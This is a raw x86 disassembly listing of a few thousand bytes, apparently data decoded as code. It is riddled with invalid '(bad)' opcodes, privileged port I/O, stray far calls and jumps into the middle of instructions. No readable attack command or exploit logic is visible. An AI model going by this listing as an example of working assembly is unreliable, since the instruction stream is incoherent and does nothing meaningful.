  4163ac:	adc    BYTE PTR [ebp-0x7b9d0ada],bl
  4163b2:	mov    eax,0x758d670c
  4163b7:	cwde   
  4163b8:	or     DWORD PTR [eax+ebx*4],esi
  4163bb:	xor    BYTE PTR [edi-0x381269f8],bl
  4163c1:	ja     0x4163e6
  4163c3:	xchg   edx,eax
  4163c4:	test   eax,0xa99ffac3
  4163c9:	and    BYTE PTR [ecx],cl
  4163cb:	inc    ebx
  4163cc:	add    ch,BYTE PTR [edx]
  4163ce:	bound  ebx,QWORD PTR [ecx]
  4163d0:	dec    ecx
  4163d1:	fdivr  QWORD PTR [ebx]
  4163d3:	mov    BYTE PTR ss:[bx+si-0x58],dh
  4163d8:	test   BYTE PTR [edi-0x1b],dl
  4163db:	pop    ss
  4163dc:	xchg   BYTE PTR [eax+eiz*8],al
  4163df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4163e0:	mov    eax,0xa423bb2e
  4163e5:	ret    
  4163e6:	sbb    bl,BYTE PTR [edx+esi*8-0x5862ce13]
  4163ed:	scas   al,BYTE PTR es:[edi]
  4163ee:	dec    edi
  4163ef:	cmp    dl,dh
  4163f1:	aaa    
  4163f2:	mov    ds:0xa0accc36,eax
  4163f7:	and    BYTE PTR [esi],al
  4163f9:	mov    ch,0x62
  4163fb:	ins    BYTE PTR es:[edi],dx
  4163fc:	xor    DWORD PTR [eax+edi*1+0x64d461d4],edx
  416403:	cs add ebp,esi
  416406:	xchg   esp,eax
  416407:	dec    ebp
  416408:	push   ebx
  416409:	(bad)  
  41640a:	aas    
  41640b:	push   ecx
  41640c:	pop    edx
  41640d:	inc    edi
  41640e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41640f:	imul   eax,DWORD PTR [edx+eax*8],0x49
  416413:	push   edx
  416414:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416415:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416416:	jmp    0x41641b
  416418:	js     0x416446
  41641a:	push   0x2e
  41641c:	mov    esi,0xf7b7e466
  416421:	dec    esi
  416422:	pusha  
  416423:	inc    ebp
  416424:	(bad)  
  416425:	js     0x416479
  416427:	xor    esi,ebx
  416429:	cmp    al,0x46
  41642b:	sbb    esi,DWORD PTR [ecx]
  41642d:	rcl    BYTE PTR [ebp-0xe183898],0x18
  416434:	pop    ss
  416435:	sbb    al,0x6
  416437:	stos   DWORD PTR es:[edi],eax
  416438:	fwait
  416439:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41643a:	sub    eax,0x8ba6d8b
  41643f:	lods   eax,DWORD PTR ds:[esi]
  416440:	cli    
  416441:	mov    DWORD PTR [edi-0x7d0b657f],edx
  416447:	pop    ds
  416448:	xchg   esp,eax
  416449:	scas   al,BYTE PTR es:[edi]
  41644a:	rol    DWORD PTR [ebx],0x5c
  41644d:	sbb    BYTE PTR [eax+0x26],0x47
  416451:	rol    DWORD PTR [esi+edx*8-0x79],cl
  416455:	sar    eax,cl
  416457:	mov    ds:0xf3439466,al
  41645c:	cwde   
  41645d:	test   al,0x36
  41645f:	xlat   BYTE PTR ds:[ebx]
  416460:	shl    DWORD PTR [ecx],cl
  416462:	mov    dh,0xff
  416464:	retf   
  416465:	bound  esp,QWORD PTR [ebx]
  416467:	and    DWORD PTR [eax-0x57],ecx
  41646a:	in     eax,0x54
  41646c:	mov    cl,0x9c
  41646e:	ret    0x731e
  416471:	dec    edx
  416472:	test   DWORD PTR [edi+esi*8-0x3f123af0],esi
  416479:	icebp  
  41647a:	mov    bl,0x5e
  41647c:	adc    BYTE PTR [eax],cl
  41647e:	mov    dl,bl
  416480:	iret   
  416481:	xchg   edx,eax
  416482:	inc    ebp
  416483:	push   es
  416484:	add    ebx,DWORD PTR ds:0xe390e820
  41648a:	xchg   edx,edx
  41648c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41648d:	arpl   WORD PTR [ecx-0x47cb8fec],bx
  416493:	sbb    DWORD PTR [eax+0x7bcd035b],edi
  416499:	jo     0x4164c6
  41649b:	sbb    ch,ah
  41649d:	jno    0x4164cb
  41649f:	outs   dx,DWORD PTR ds:[esi]
  4164a0:	mov    bh,0x5a
  4164a2:	and    ebx,ebx
  4164a4:	aaa    
  4164a5:	and    BYTE PTR [edx+0x20],al
  4164a8:	in     eax,dx
  4164a9:	loope  0x416500
  4164ab:	adc    ebx,DWORD PTR [ebp+0x64079c3d]
  4164b1:	mov    edx,ss
  4164b3:	xor    al,0x2a
  4164b5:	clc    
  4164b6:	lods   al,BYTE PTR ds:[esi]
  4164b7:	mov    edx,DWORD PTR [esi+esi*1-0xd]
  4164bb:	mov    ah,0xcb
  4164bd:	xchg   edi,eax
  4164be:	ins    DWORD PTR es:[edi],dx
  4164bf:	ins    DWORD PTR es:[edi],dx
  4164c0:	mov    eax,ds:0xc137d7d0
  4164c5:	mov    ebp,0x4308d9d2
  4164ca:	mov    ds:0x9383cf12,eax
  4164cf:	xor    bl,BYTE PTR [eax-0x1a]
  4164d2:	nop
  4164d3:	mov    eax,0xe7feec36
  4164d8:	outs   dx,BYTE PTR ds:[esi]
  4164d9:	pushf  
  4164da:	std    
  4164db:	push   cs
  4164dc:	adc    dl,BYTE PTR [ebx+eax*8]
  4164df:	out    dx,al
  4164e0:	bound  edx,QWORD PTR [eax+0x7b7b39c4]
  4164e6:	ins    BYTE PTR es:[edi],dx
  4164e7:	aas    
  4164e8:	mov    ebp,0x4eeb6f64
  4164ed:	xor    eax,0xbe09ca13
  4164f2:	das    
  4164f3:	adc    esi,ecx
  4164f5:	js     0x4164a7
  4164f7:	rol    BYTE PTR [edx-0x33],cl
  4164fa:	xor    eax,0x55ae00b2
  4164ff:	xor    cl,0x42
  416502:	jecxz  0x41651f
  416504:	aam    0x8d
  416506:	inc    edi
  416507:	pop    ebx
  416508:	mov    DWORD PTR [eax+0x78b5163c],ebp
  41650e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41650f:	mov    ecx,0x11433b20
  416514:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416515:	and    DWORD PTR [ebx],esi
  416517:	retf   0x2bf6
  41651a:	mov    edx,0xc59c5b5
  41651f:	cmp    al,0x9a
  416521:	jg     0x416537
  416523:	jle    0x4164f6
  416525:	cs mov dl,0x1a
  416528:	mov    cl,0x6e
  41652a:	jl     0x4164ff
  41652c:	dec    edi
  41652d:	adc    BYTE PTR [edi+0x4486d0ad],dh
  416533:	ret    0x8c31
  416536:	std    
  416537:	sti    
  416538:	hlt    
  416539:	cmp    al,BYTE PTR ds:0xd93a574d
  41653f:	in     eax,0xf0
  416541:	fisubr WORD PTR [ebp-0x643df8e7]
  416547:	out    0xa,al
  416549:	(bad)  
  41654a:	jle    0x416556
  41654c:	call   0x1ba6a4bb
  416551:	mov    dh,0xb3
  416553:	xchg   ebp,eax
  416554:	cwde   
  416555:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416556:	(bad)  
  416557:	ja     0x4164eb
  416559:	jle    0x4165da
  41655b:	cld    
  41655c:	fxch   st(4)
  41655e:	out    dx,eax
  41655f:	add    esi,DWORD PTR [edx]
  416561:	sbb    eax,0x97fd8b44
  416566:	mov    cs,esp
  416568:	sbb    BYTE PTR [ebx],dh
  41656a:	mov    bl,0xbc
  41656c:	pushf  
  41656d:	or     DWORD PTR [edi],ebx
  41656f:	or     bl,0x4d
  416572:	fisubr DWORD PTR [esi-0x4d]
  416575:	inc    ecx
  416576:	mov    es,WORD PTR [ebp-0xa]
  416579:	sbb    bh,BYTE PTR [esi+eax*4-0x7e]
  41657d:	sbb    BYTE PTR gs:[edx],0x3f
  416581:	xchg   edx,eax
  416582:	dec    edi
  416583:	imul   ecx,ebx,0x1b
  416586:	mov    dl,al
  416588:	xchg   edi,eax
  416589:	das    
  41658a:	adc    DWORD PTR [esi],esi
  41658c:	call   0x26845712
  416591:	lahf   
  416592:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416593:	test   dl,ah
  416595:	clc    
  416596:	jge    0x4165c6
  416598:	mov    ah,0x5a
  41659a:	pop    ss
  41659b:	add    ebp,DWORD PTR [edx+0x51]
  41659e:	jecxz  0x416544
  4165a0:	pop    edi
  4165a1:	sub    al,0x10
  4165a3:	xchg   ebx,eax
  4165a4:	lock loope 0x416539
  4165a7:	xor    dl,BYTE PTR ds:0x55836762
  4165ad:	test   DWORD PTR [esi+eiz*1+0x479dfa09],0xd62d0d81
  4165b8:	jp     0x4165ac
  4165ba:	aaa    
  4165bb:	popa   
  4165bc:	xchg   ecx,eax
  4165bd:	outs   dx,DWORD PTR ds:[esi]
  4165be:	jle    0x41660a
  4165c0:	inc    esi
  4165c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4165c2:	mov    ds:0xcb891a93,al
  4165c7:	out    0x3,al
  4165c9:	pop    ebx
  4165ca:	jae    0x4165a9
  4165cc:	popf   
  4165cd:	aas    
  4165ce:	mov    eax,0x61c7d150
  4165d3:	jp     0x41659c
  4165d5:	fisttp WORD PTR [ecx+eiz*4+0x4b62f841]
  4165dc:	(bad)  [edi]
  4165de:	pop    esi
  4165df:	dec    esp
  4165e0:	mov    ds:0xc1190612,eax
  4165e5:	mov    ebp,DWORD PTR [edi]
  4165e7:	ja     0x41656c
  4165e9:	add    BYTE PTR [edi+0x14],bh
  4165ec:	fst    QWORD PTR [ebx-0x6b]
  4165ef:	cwde   
  4165f0:	shr    ch,0x31
  4165f3:	adc    DWORD PTR [edx],eax
  4165f5:	push   es
  4165f6:	add    eax,0x3bcba914
  4165fb:	fcomp  DWORD PTR [esi]
  4165fd:	lea    ebx,[ebx+esi*8-0x34]
  416601:	clc    
  416602:	mov    ebp,0x8958b4e8
  416607:	or     DWORD PTR [edi],0xffffffa7
  41660a:	jecxz  0x4165a8
  41660c:	and    eax,0x5502040
  416611:	retf   
  416612:	mov    eax,ds:0x6df27a04
  416617:	push   0xa29589dc
  41661c:	int    0xf3
  41661e:	ja     0x416629
  416620:	inc    ebp
  416621:	fwait
  416622:	mov    esi,0xd94c4936
  416627:	mov    esi,0x2aca2d55
  41662c:	xor    BYTE PTR [edi-0x13],0x15
  416630:	and    cl,bl
  416632:	in     al,0x4b
  416634:	mov    eax,ds:0x91da61b4
  416639:	inc    ebx
  41663a:	fwait
  41663b:	jge    0x416698
  41663d:	add    bh,ch
  41663f:	inc    ebp
  416640:	xor    eax,0xfd36beeb
  416645:	dec    edi
  416646:	push   ebx
  416647:	retf   0x556c
  41664a:	sbb    ebp,esp
  41664c:	push   ebp
  41664d:	mov    al,ds:0xa6aaf3e4
  416652:	cmp    esp,DWORD PTR [edx-0x63]
  416655:	scas   al,BYTE PTR es:[edi]
  416656:	neg    DWORD PTR [ebx+0x73]
  416659:	loope  0x416606
  41665b:	loopne 0x4166a7
  41665d:	xor    eax,0x8857143
  416662:	cmc    
  416663:	fnstenv [esi+0x541ca523]
  416669:	imul   esp,DWORD PTR [ebx+0x5cdbd387],0xeb36fe99
  416673:	inc    ebx
  416674:	ror    DWORD PTR [ebx+0x77c4de4b],cl
  41667a:	sbb    ah,bl
  41667c:	stos   DWORD PTR es:[edi],eax
  41667d:	cwde   
  41667e:	adc    al,0x50
  416680:	jno    0x41668f
  416682:	push   cs
  416683:	xor    eax,0xe4121f05
  416688:	scas   eax,DWORD PTR es:[edi]
  416689:	xchg   edi,eax
  41668a:	jle    0x416643
  41668c:	ds aad 0xb5
  41668f:	sti    
  416690:	iret   
  416691:	sub    edi,esi
  416693:	mov    eax,0x985499e3
  416698:	cmp    esp,DWORD PTR [edi+edi*4]
  41669b:	or     DWORD PTR [edx],ebx
  41669d:	dec    ecx
  41669e:	dec    ebx
  41669f:	popa   
  4166a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4166a1:	pop    ecx
  4166a2:	fimul  WORD PTR [eax]
  4166a4:	jle    0x416648
  4166a6:	mov    eax,0x7a61c9bb
  4166ab:	(bad)  
  4166ac:	cmp    DWORD PTR ds:0xd41e4575,ebp
  4166b2:	fs sti 
  4166b4:	ret    
  4166b5:	add    ebx,DWORD PTR [ebx]
  4166b7:	mov    BYTE PTR [ebp+0x36cbbc47],dl
  4166bd:	gs fdiv st,st(5)
  4166c0:	and    edx,DWORD PTR [edx+0x307caae0]
  4166c6:	sbb    eax,0xd34feba0
  4166cb:	iret   
  4166cc:	mov    al,0xf7
  4166ce:	ss test eax,0x643317f1
  4166d4:	pop    edi
  4166d5:	call   0xc6b0:0xebaa514d
  4166dc:	fbld   TBYTE PTR ds:[edx]
  4166df:	push   edx
  4166e0:	scas   eax,DWORD PTR es:[edi]
  4166e1:	pop    esi
  4166e2:	lea    ecx,[ebx-0x32b6ae26]
  4166e8:	or     DWORD PTR [ebp-0x1d288079],esp
  4166ee:	add    edx,ebp
  4166f0:	repz adc al,0x31
  4166f3:	aas    
  4166f4:	pop    esi
  4166f5:	pop    edx
  4166f6:	add    ah,BYTE PTR [edx-0x33cd164d]
  4166fc:	sbb    ah,ah
  4166fe:	test   BYTE PTR [ebx+edi*1+0x7a06c988],bh
  416705:	mov    eax,0xaae466f9
  41670a:	mov    esi,0x44f74355
  41670f:	fcmovnb st,st(7)
  416711:	dec    DWORD PTR [ecx]
  416713:	sbb    edx,ebx
  416715:	pushf  
  416716:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416717:	mov    al,ds:0x59cc1ef9
  41671c:	dec    esi
  41671d:	lea    edi,[eax+0x6d]
  416720:	jecxz  0x416749
  416722:	test   DWORD PTR [ecx-0x509c169f],edx
  416728:	pusha  
  416729:	in     al,0x44
  41672b:	das    
  41672c:	pop    ecx
  41672d:	loop   0x416706
  41672f:	mov    edx,0x4291949d
  416734:	fldl2t 
  416736:	or     al,0x57
  416738:	pushf  
  416739:	mov    dl,0xb6
  41673b:	stc    
  41673c:	stc    
  41673d:	rol    al,1
  41673f:	jns    0x4166d7
  416741:	aas    
  416742:	inc    ebp
  416743:	sbb    eax,0x9382c803
  416748:	pop    ss
  416749:	cld    
  41674a:	adc    dh,BYTE PTR [esi-0x125377eb]
  416750:	into   
  416751:	icebp  
  416752:	leave  
  416753:	xchg   edi,eax
  416754:	shl    bl,0xed
  416757:	leave  
  416758:	or     DWORD PTR [ecx+0x1cfea7c8],edx
  41675e:	stos   DWORD PTR es:[edi],eax
  41675f:	aam    0x12
  416761:	adc    eax,0x56ef4312
  416766:	ins    BYTE PTR es:[edi],dx
  416767:	xor    BYTE PTR [edi+0x33],bl
  41676a:	push   ebp
  41676b:	data16 je 0x416751
  41676e:	or     edi,0xffffffcb
  416771:	mov    eax,0x498c278f
  416776:	mov    ds:0x9fd2680c,eax
  41677b:	stos   BYTE PTR es:[edi],al
  41677c:	cmp    al,0x48
  41677e:	mov    edi,0xd50edb09
  416783:	call   0x621be140
  416788:	dec    eax
  416789:	lock rcr DWORD PTR [ebx],1
  41678c:	adc    eax,0xa75c5929
  416791:	mov    al,0xf6
  416793:	push   ebp
  416794:	xor    al,0xab
  416796:	jo     0x416783
  416798:	cmp    DWORD PTR [esi-0x42],esp
  41679b:	pop    ds
  41679c:	jecxz  0x416752
  41679e:	adc    dh,ah
  4167a0:	push   ecx
  4167a1:	xor    ecx,DWORD PTR [edx+0x70]
  4167a4:	out    0xd7,eax
  4167a6:	fst    DWORD PTR [edi]
  4167a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167a9:	fwait
  4167aa:	mov    bh,dl
  4167ac:	cmp    al,0xb2
  4167ae:	rcl    dl,0x4e
  4167b1:	cmp    BYTE PTR [ecx+edi*8-0x3b],dl
  4167b5:	and    eax,0xe825d22d
  4167ba:	mov    bh,0x3
  4167bc:	out    0xa9,al
  4167be:	mov    edx,DWORD PTR [ecx]
  4167c0:	push   0xffffff8e
  4167c2:	retf   0x23ef
  4167c5:	jg     0x41677f
  4167c7:	mov    esp,0x89addd2c
  4167cc:	data16 fild DWORD PTR es:[ecx-0x6673a4e2]
  4167d4:	lahf   
  4167d5:	test   BYTE PTR [ebx+0x1c655a7f],dl
  4167db:	mov    bl,BYTE PTR [esi-0x6a29fd58]
  4167e1:	mov    DWORD PTR [edi+0x15fb66e5],eax
  4167e7:	or     esp,edi
  4167e9:	pushf  
  4167ea:	fbld   TBYTE PTR [esi+ecx*2+0x7e]
  4167ee:	xchg   ebp,eax
  4167ef:	lea    ebx,fs:0x5d009c65
  4167f6:	inc    eax
  4167f7:	xchg   BYTE PTR ds:0x6fdef103,ch
  4167fd:	adc    al,0x12
  4167ff:	xor    dh,BYTE PTR [edx+ebx*1]
  416802:	or     al,0x4d
  416804:	fstp   QWORD PTR [ebx+0x10c5cf13]
  41680a:	adc    eax,0x3478ac45
  41680f:	xchg   ebx,eax
  416810:	push   cs
  416811:	sub    al,ch
  416813:	xor    BYTE PTR [edx],bl
  416815:	int3   
  416816:	or     DWORD PTR [edx-0x71],edx
  416819:	mov    cl,0x20
  41681b:	inc    eax
  41681c:	outs   dx,BYTE PTR ds:[esi]
  41681d:	jle    0x416881
  41681f:	pop    eax
  416820:	sub    eax,0x73f7b9f0
  416825:	das    
  416826:	mov    al,ds:0x12a4cb75
  41682b:	xor    eax,DWORD PTR ds:0xc52e41d2
  416831:	add    edi,DWORD PTR [eax]
  416833:	dec    esp
  416834:	test   DWORD PTR [edx],0xeb489890
  41683a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41683b:	cmp    eax,0x64e6a6b7
  416840:	push   edi
  416841:	pop    es
  416842:	aam    0xb9
  416844:	push   esi
  416845:	jle    0x4167d0
  416847:	mov    BYTE PTR [eax-0x1a],0x42
  41684b:	sbb    BYTE PTR [ecx-0x6ecaf70e],ah
  416851:	sti    
  416852:	(bad)  
  416853:	jbe    0x416883
  416855:	aad    0x67
  416857:	adc    DWORD PTR [esp+edx*4+0x5b14358c],0x93fc827f
  416862:	pop    es
  416863:	add    DWORD PTR [esi+eiz*4-0x37],0xffffffeb
  416868:	push   esi
  416869:	xchg   ebp,eax
  41686a:	or     ebx,DWORD PTR ds:0x28fef298
  416870:	ror    BYTE PTR [ecx-0x65],cl
  416873:	sbb    BYTE PTR [ecx],bl
  416875:	adc    ecx,edi
  416877:	popa   
  416878:	fs mov dh,0xd3
  41687b:	gs repz ss pop ebp
  41687f:	in     al,0xfb
  416881:	mov    eax,0x79387c4
  416886:	dec    ecx
  416887:	(bad)  
  416888:	inc    DWORD PTR [ecx-0x2e]
  41688b:	mov    ds:0xe443fbd3,eax
  416890:	aas    
  416891:	ins    DWORD PTR es:[edi],dx
  416892:	loopne 0x4168e9
  416894:	adc    eax,0x6512eeb4
  416899:	jle    0x41686f
  41689b:	mov    ebp,0xa0a84f09
  4168a0:	loopne 0x416909
  4168a2:	sar    dl,cl
  4168a4:	cmp    eax,0xad4f509c
  4168a9:	ja     0x416889
  4168ab:	nop
  4168ac:	sub    esp,DWORD PTR [eax+0x12845a58]
  4168b2:	sbb    DWORD PTR [ebx],esp
  4168b4:	mov    edi,0x403bd9f
  4168b9:	fwait
  4168ba:	(bad)  
  4168bb:	cmp    DWORD PTR [edi-0x70df7242],esi
  4168c1:	jl     0x416942
  4168c3:	je     0x416922
  4168c5:	sub    edx,DWORD PTR [edi]
  4168c7:	je     0x416907
  4168c9:	adc    BYTE PTR [edx],dl
  4168cb:	rcl    BYTE PTR [ebx],0x26
  4168ce:	push   ss
  4168cf:	cmp    DWORD PTR [ebx],0x74cbde53
  4168d5:	mov    bl,0xb6
  4168d7:	adc    eax,0xa481a762
  4168dc:	jnp    0x416909
  4168de:	enter  0xcb8,0x7b
  4168e2:	or     dh,ch
  4168e4:	aad    0xc0
  4168e6:	adc    bl,BYTE PTR es:[edi]
  4168e9:	sbb    ch,bl
  4168eb:	out    dx,eax
  4168ec:	test   eax,0x9b3c3c7d
  4168f1:	dec    edx
  4168f2:	popa   
  4168f3:	hlt    
  4168f4:	popa   
  4168f5:	xchg   esi,eax
  4168f6:	or     edi,DWORD PTR [edi-0x3]
  4168f9:	ret    0xa543
  4168fc:	or     DWORD PTR [esi],ecx
  4168fe:	cdq    
  4168ff:	mov    edx,0x69738523
  416904:	inc    edi
  416905:	sbb    eax,0xc5ce48bf
  41690a:	fisubr DWORD PTR [edi-0x14]
  41690d:	cmp    cl,ch
  41690f:	ja     0x41698f
  416911:	and    DWORD PTR [ebx+0x32],edx
  416914:	mov    eax,ds:0xf007cfcd
  416919:	cdq    
  41691a:	sub    DWORD PTR [eax+0x7fe33978],ebp
  416920:	mov    ds:0xbca81361,al
  416925:	fimul  WORD PTR [esi]
  416927:	fmul   QWORD PTR [edx]
  416929:	add    ecx,DWORD PTR [ebx+0x36]
  41692c:	hlt    
  41692d:	mov    ds:0x78261d0d,eax
  416932:	mov    esp,ebp
  416934:	xchg   esi,eax
  416935:	inc    eax
  416936:	fdivr  st(4),st
  416938:	jne    0x41692d
  41693a:	pop    edi
  41693b:	ja     0x4169ae
  41693d:	xchg   edx,eax
  41693e:	mov    ah,0xc6
  416940:	lds    edx,FWORD PTR [edx+0x6b]
  416943:	adc    bl,BYTE PTR [edi+0x4d]
  416946:	sbb    DWORD PTR [edi-0x579b2fcd],0xffffff8e
  41694d:	aaa    
  41694e:	iret   
  41694f:	js     0x416951
  416951:	inc    eax
  416952:	call   0x6efa:0xb5a2124d
  416959:	and    BYTE PTR [ebp+0x16a3468],0x4d
  416960:	lahf   
  416961:	or     BYTE PTR [eax+0x3eda922],dl
  416967:	inc    esp
  416968:	aas    
  416969:	adc    bh,BYTE PTR [ebp-0x40]
  41696c:	sub    ebp,eax
  41696e:	data16 ja 0x416947
  416971:	inc    ebx
  416972:	adc    al,0x4a
  416974:	sahf   
  416975:	mov    BYTE PTR [ebp+0x18],dl
  416978:	aas    
  416979:	into   
  41697a:	adc    BYTE PTR [ecx],bh
  41697c:	xlat   BYTE PTR gs:[ebx]
  41697e:	sbb    edx,DWORD PTR [edx+0x69]
  416981:	jp     0x416919
  416983:	call   0x108b:0x9b93db4b
  41698a:	shr    DWORD PTR [ebp-0x5554cc46],cl
  416990:	jl     0x4169fc
  416992:	(bad)  
  416993:	ins    DWORD PTR es:[edi],dx
  416994:	ins    BYTE PTR es:[edi],dx
  416995:	xchg   dl,dl
  416997:	repnz nop
  416999:	inc    esi
  41699a:	pop    esi
  41699b:	scas   al,BYTE PTR es:[edi]
  41699c:	outs   dx,DWORD PTR ds:[esi]
  41699d:	in     eax,dx
  41699e:	sbb    eax,0x6c1b785c
  4169a3:	sar    eax,1
  4169a5:	mov    ds:0x25bb86f8,eax
  4169aa:	fs std 
  4169ac:	mov    ds:0x1a740e44,al
  4169b1:	in     eax,0x74
  4169b3:	cli    
  4169b4:	lds    eax,FWORD PTR [ebx+ecx*2-0x47]
  4169b8:	xor    eax,0x4b83e81e
  4169bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4169be:	push   esp
  4169bf:	cld    
  4169c0:	pop    ds
  4169c1:	sub    bl,dh
  4169c3:	in     al,dx
  4169c4:	retf   
  4169c5:	pop    edi
  4169c6:	cmp    eax,0x949bd4c7
  4169cb:	outs   dx,DWORD PTR ds:[esi]
  4169cc:	inc    ebx
  4169cd:	adc    DWORD PTR [edx],eax
  4169cf:	leave  
  4169d0:	in     al,0x23
  4169d2:	arpl   WORD PTR [ecx],di
  4169d4:	cli    
  4169d5:	fwait
  4169d6:	iret   
  4169d7:	mov    al,0xda
  4169d9:	jns    0x416a35
  4169db:	(bad)  
  4169dd:	mov    ebp,0xee85e179
  4169e2:	jno    0x41698e
  4169e4:	enter  0x77f7,0xc2
  4169e8:	fst    DWORD PTR [ebp+0x1f9bab6c]
  4169ee:	enter  0xca1f,0x71
  4169f2:	test   eax,0xd5c5c384
  4169f7:	or     eax,0x12c5b078
  4169fc:	adc    dh,ah
  4169fe:	or     eax,DWORD PTR [ebx]
  416a00:	jns    0x4169f6
  416a02:	je     0x416a01
  416a04:	out    dx,al
  416a05:	loop   0x4169da
  416a07:	cld    
  416a08:	jo     0x4169d1
  416a0a:	shl    DWORD PTR [ebx-0x62],1
  416a0d:	cmc    
  416a0e:	xchg   ebx,eax
  416a0f:	inc    eax
  416a10:	or     BYTE PTR [edx],bl
  416a12:	dec    ebp
  416a13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a14:	add    al,0x8f
  416a16:	ja     0x4169c0
  416a18:	inc    ebx
  416a19:	dec    edx
  416a1a:	inc    ebp
  416a1b:	dec    edi
  416a1c:	or     bl,bl
  416a1e:	mov    ebp,0xadf9fa80
  416a23:	call   0xd2f567f1
  416a28:	and    al,0x48
  416a2a:	mov    bh,0x27
  416a2c:	or     ecx,DWORD PTR [eax-0x612cfa68]
  416a32:	mov    ecx,0x47cf320e
  416a37:	loop   0x4169c8
  416a39:	push   ss
  416a3a:	jbe    0x416a72
  416a3c:	lea    edx,[esi]
  416a3e:	xchg   esp,eax
  416a3f:	jmp    0x416a3b
  416a41:	rcl    BYTE PTR [esi],1
  416a43:	mov    ds:0x480f44a5,eax
  416a48:	retf   0xd988
  416a4b:	call   0xb9b2e7a3
  416a50:	(bad)  
  416a51:	in     al,0xc6
  416a53:	add    eax,ebp
  416a55:	je     0x4169e5
  416a57:	cs fxch st(6)
  416a5a:	push   ebp
  416a5b:	in     eax,0xa
  416a5d:	popa   
  416a5e:	cmc    
  416a5f:	push   eax
  416a60:	add    ebx,ecx
  416a62:	mov    edx,0x47400c9c
  416a67:	sub    DWORD PTR ds:0x18183b40,ebx
  416a6d:	enter  0x6bfd,0xe
  416a71:	jge    0x416a71
  416a73:	mov    DWORD PTR [edi+0x67d5e9af],ebx
  416a79:	adc    eax,0x74fe53b
  416a7e:	mov    ch,0x94
  416a80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a81:	inc    eax
  416a82:	pop    ebp
  416a83:	gs mov ecx,0xec43cbf8
  416a89:	retf   0x85cf
  416a8c:	cmp    DWORD PTR [esi],ebp
  416a8e:	jmp    DWORD PTR [esi+0x78]
  416a91:	shl    BYTE PTR [ecx+edx*1-0x78689eb],0x8c
  416a99:	mov    ds:0x56b4aa07,eax
  416a9e:	jnp    0x416b00
  416aa0:	ret    0x59fa
  416aa3:	mov    ebp,0xdf2672f4
  416aa8:	adc    cl,BYTE PTR [edi+0x2384a9f1]
  416aae:	jo     0x416a83
  416ab0:	add    BYTE PTR [ebx-0x77c3775c],ch
  416ab6:	cmp    eax,0x55df80f9
  416abb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416abc:	xchg   ebx,eax
  416abd:	and    ah,BYTE PTR [eax+0x1924790c]
  416ac3:	xor    al,0x60
  416ac5:	mov    esp,0x25dacd4
  416aca:	pop    esi
  416acb:	aaa    
  416acc:	mov    al,ds:0x8528ef69
  416ad1:	jbe    0x416b41
  416ad3:	xor    BYTE PTR [ebx+0x14],ch
  416ad6:	iret   
  416ad7:	enter  0x65d,0xa3
  416adb:	mov    eax,ds:0xe668c92f
  416ae0:	div    DWORD PTR [edx]
  416ae2:	leave  
  416ae3:	test   dl,ah
  416ae5:	in     eax,0x3f
  416ae7:	pop    ecx
  416ae8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ae9:	js     0x416b57
  416aeb:	push   eax
  416aec:	lahf   
  416aed:	out    dx,al
  416aee:	cmp    al,0x51
  416af0:	ds (bad) 
  416af2:	data16 stos BYTE PTR es:[edi],al
  416af4:	fmul   QWORD PTR [eax-0x6db7087f]
  416afa:	xor    bh,BYTE PTR [edx+0x3]
  416afd:	sbb    esi,DWORD PTR [esi+ebx*1]
  416b00:	mov    ecx,0x45653a61
  416b05:	add    eax,0x1d23826a
  416b0a:	xor    cl,dh
  416b0c:	push   ebp
  416b0d:	outs   dx,BYTE PTR ds:[esi]
  416b0e:	push   eax
  416b0f:	and    al,0x28
  416b11:	pop    edi
  416b12:	jg     0x416ac1
  416b14:	push   eax
  416b15:	inc    edx
  416b16:	inc    edx
  416b17:	sbb    eax,0xd9a6b3ba
  416b1c:	test   eax,0x983d55bc
  416b21:	mov    eax,DWORD PTR [ebx-0x75]
  416b24:	pop    ecx
  416b25:	inc    ecx
  416b26:	xchg   edx,eax
  416b27:	out    dx,al
  416b28:	sbb    eax,0xf42e48a9
  416b2d:	adc    eax,0x615a7df6
  416b32:	mov    dx,0xc8b6
  416b36:	ds push 0xffffffa4
  416b39:	sub    edi,edi
  416b3b:	aas    
  416b3c:	and    ebp,esp
  416b3e:	and    al,0xf8
  416b40:	mov    edi,edi
  416b42:	test   DWORD PTR [eax+esi*2],esp
  416b45:	jmp    0x416bb4
  416b47:	mov    eax,ds:0xd78e5de8
  416b4c:	into   
  416b4d:	shl    DWORD PTR [ebx+0x73],cl
  416b50:	sub    al,0x54
  416b52:	pop    ds
  416b53:	gs cmp edi,edx
  416b56:	jmp    0x416b66
  416b58:	push   es
  416b59:	ror    DWORD PTR [ebp-0x2c971d9c],cl
  416b5f:	out    0xe0,eax
  416b61:	jbe    0x416b40
  416b63:	dec    ebp
  416b64:	mov    DWORD PTR [ebx-0x6e],esp
  416b67:	out    0x21,eax
  416b69:	ret    
  416b6a:	jmp    0x9ff5d452
  416b6f:	mov    ecx,DWORD PTR ds:0x9b062041
  416b75:	pop    esp
  416b76:	in     al,dx
  416b77:	mov    ebp,DWORD PTR [esi+0x52a1d8a3]
  416b7d:	(bad)  
  416b7e:	mov    dh,0xc4
  416b80:	(bad)  
  416b81:	dec    edx
  416b82:	jmp    0x2986:0x3401bf4d
  416b89:	ins    DWORD PTR es:[edi],dx
  416b8a:	push   cs
  416b8b:	push   esp
  416b8c:	dec    ecx
